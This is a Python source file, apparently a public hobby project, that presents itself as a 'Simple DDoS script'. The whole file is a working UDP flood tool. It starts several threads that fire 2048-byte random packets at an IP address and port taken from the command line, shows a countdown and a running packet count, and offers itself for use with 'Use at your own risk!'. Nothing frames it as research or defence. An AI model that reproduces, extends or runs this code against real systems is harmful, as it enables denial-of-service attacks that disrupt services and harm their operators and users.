import os
import time
import socket
import random
import threading
import argparse

LICENSE = """
# DDoS Script
# Copyright (c) 2023 SSL-ACTX
# Licensed under the MIT License
"""

# Color codes
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

class AttackThread(threading.Thread):
    def __init__(self, ip, port, num_packets):
        super().__init__()
        self.ip = ip
        self.port = port
        self.num_packets = num_packets
        self.packets_sent = 0

    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = random._urandom(2048)
        sent = 0

        try:
            while sent < self.num_packets:
                sock.sendto(bytes_to_send, (self.ip, self.port))
                sent += 1
                self.packets_sent += 1
                time.sleep(0.001)
        except KeyboardInterrupt:
            pass

def countdown():
    for i in range(3, 0, -1):
        print("Starting attack in %d seconds..." % i, end="\r")
        time.sleep(1)

def show_ascii_header():
    header = """

   _____   __    __                 __
  /  _  \_/  |__/  |______    ____ |  | __
 /  /_\  \   __\   __\__  \ _/ ___\|  |/ /
/    |    \  |  |  |  / __ \\  \___|    <
\____|__  /__|  |__| (____  /\___  >__|_ \\
        \/                \/     \/     \/
        Use at your own risk! :v

    """
    print(header)

def main():
    parser = argparse.ArgumentParser(description="Simple DDoS script")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads to use")
    parser.add_argument("-p", "--packets", type=int, default=100, help="Number of packets to send")
    args = parser.parse_args()

    show_ascii_header()

    try:
        socket.inet_aton(args.ip)  # Check if the provided IP is valid
    except socket.error:
        print("Invalid IP address.")
        return

    if not (0 <= args.port <= 65535):
        print("Invalid port number. Port should be between 0 and 65535.")
        return

    os.system("clear")
    show_ascii_header()
    print("\n" + Colors.OKGREEN + "\nAuthor   : SSL-ACTX")
    print("GitHub   : " + Colors.OKBLUE + "https://github.com/SSL-ACTX")

    countdown()
    os.system("clear")
    print("\nAttacking %s:%d with %d threads" % (args.ip, args.port, args.threads))
    attack(args.ip, args.port, args.threads, args.packets)  # Pass the num_packets argument

def attack_load(threads):
    total_packets_sent = 0

    while any(thread.is_alive() for thread in threads):
        total_packets_sent = sum(thread.packets_sent for thread in threads)

        # show_ascii_header()

        print("Total Packets sent: %d" % total_packets_sent, end="\r")
        time.sleep(0.1)
        print(" " * 50, end="\r")

def attack(ip, port, num_threads, num_packets):
    threads = []

    for _ in range(num_threads):
        thread = AttackThread(ip, port, num_packets)  # Use the custom AttackThread class
        thread.daemon = True
        thread.start()
        threads.append(thread)

    attack_load(threads)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print(LICENSE)
    main()
